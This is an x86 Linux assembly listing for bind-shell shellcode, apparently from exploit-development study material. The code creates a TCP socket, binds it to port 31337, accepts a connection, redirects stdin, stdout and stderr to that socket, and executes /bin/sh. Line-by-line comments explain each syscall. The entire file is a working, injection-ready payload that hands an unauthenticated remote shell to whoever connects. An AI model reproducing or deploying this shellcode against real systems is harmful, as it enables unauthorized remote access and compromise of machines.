BITS 32

; socketcall(int call, unsigned long *args)

; s = socket(2, 1, 0) // s = socket(PF_INET, SOCK_STREAM, 0)
    push BYTE 0x66          ; SocketCall is syscall #102 (0x66)
    pop eax
    cdq                     ; Zero out edx for use as a null DWORD later
    xor ebx, ebx            ; Type of socketcall
    inc ebx                 ; 1 = SYS_SOCKET = socket()
    push edx                ; Build arg array in reverse: {protocol = 0, SOCK_STREAM = 1, AF_INET = 2}
    push BYTE 0x01
    push BYTE 0x02
    mov ecx, esp            ; ecx = ptr to argument array
    int 0x80                ; After syscall, eax has socket file descriptor

    mov esi, eax            ; Save socket Fd into ESI

; bind(s, [2, 31337, 0], 16)
    push BYTE 0x66
    pop eax
    inc ebx                 ; 2 = SYS_BIND = bind()
    push edx                ; Build sockaddr struct in reverse: { INADDR_ANY = 0,  
    push WORD 0x697a        ;                                     Port 31337,
    push WORD bx            ;                                     AF_INET = 2 }
    mov ecx, esp            ; ecx = server struct pointer
    push BYTE 16            ; argv: { sizeof(server struct) = 16,  
    push ecx                ;         server struct pointer,
    push esi                ;         socket FD }
    mov ecx, esp            ; ecx = argument array
    int 0x80

; listen (s, 0)
    mov BYTE al, 0x66       
    inc ebx                 
    inc ebx                 ; ebx == 4 ==SYS_LISTEN = listen()
    push ebx                ; argv: { backlog = 4,
    push esi                ;         socket fd }
    mov ecx, esp            ; ecx = argument array
    int 0x80

; c = accept(s, 0, 0)
    mov BYTE al, 0x66
    inc ebx                 ; ebx = 5 = SYS_ACCEPT = accept()
    push edx                ; argv = { socklen = 0,
    push edx                ;          sockaddr ptr = NULL,
    push esi                ;          socket fd }
    mov ecx, esp            ; ecx = argv
    int 0x80

; dup2(connected socket, {all three standard I/O FDs})
    mov ebx, eax            ; Move socket FD in ebx
    push BYTE 0x3F          ; dup2 syscall #63
    pop eax
    xor ecx, ecx            ; ecx = 0 = stdin
    int 0x80                ; dup(c, 0)
    mov BYTE al, 0x3F
    inc ecx                 ; ecx = 1 = stdout
    int 0x80                ; dup(c, 1)
    mov byte al, 0x3F
    inc ecx                 ; ecx = 2 = stderr
    int 0x80                ; dup(c, 2)

; execve(const char *fname, char *const *argv [], char *const envp[])
    mov BYTE al, 11         ; execve syscall #11
    push edx                ;
    push 0x68732f2f         ; '//sh'
    push 0x6e69622f         ; '/bin'
    mov ebx, esp
    push ecx                ; push 32b null terminator to stack
    mov edx, esp            ; Empty array for envp
    push ebx                ; Push string addr to stack above null terminator
    mov ecx, esp            ; This is the argv array with str pointer
    int 0x80                ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])